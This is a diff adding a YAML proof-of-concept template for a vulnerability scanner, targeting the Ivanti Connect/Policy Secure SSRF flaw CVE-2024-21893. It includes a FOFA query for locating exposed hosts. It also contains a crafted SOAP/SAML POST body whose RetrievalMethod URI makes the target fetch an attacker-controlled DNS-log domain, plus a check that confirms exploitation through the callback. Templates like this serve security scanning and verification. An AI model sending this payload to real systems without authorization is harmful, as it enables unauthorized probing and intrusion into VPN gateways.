@@ -1,0 +1,31 @@
+id: poc-yaml-ivanti-policy-secure-vpn-ssrf
+info:
+  name: ivanti policy secure VPN SSRF漏洞(CVE-2024-21893)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - ssrf
+  - CVE-2024-21893
+  finger: Ivanti Connect Secure
+  fofa: title="Ivanti Connect Secure - PleaseWait" && is_domain=false
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /dana-ws/saml20.ws
+  data: <?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>   <ds:Signature   xmlns:ds="http://www.w3.org/2000/09/xmldsig#">      <ds:SignedInfo>       <ds:CanonicalizationMethod
+    Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>        <ds:SignatureMethod
+    Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>      </ds:SignedInfo>      <ds:SignatureValue>qwerty</ds:SignatureValue>     <ds:KeyInfo
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig"
+    xmlns:ds="http://www.w3.org/2000/09/xmldsig#">       <ds:RetrievalMethod URI="http://{{.domain}}"/>       <ds:X509Data/>      </ds:KeyInfo>     <ds:Object></ds:Object>   </ds:Signature>
+    </soap:Body></soap:Envelope>
+  expression: 'status_code == 500
+
+    && contains(body,"Ivanti") &&
+
+    reverse.Verify()
+
+    '
+transport: http
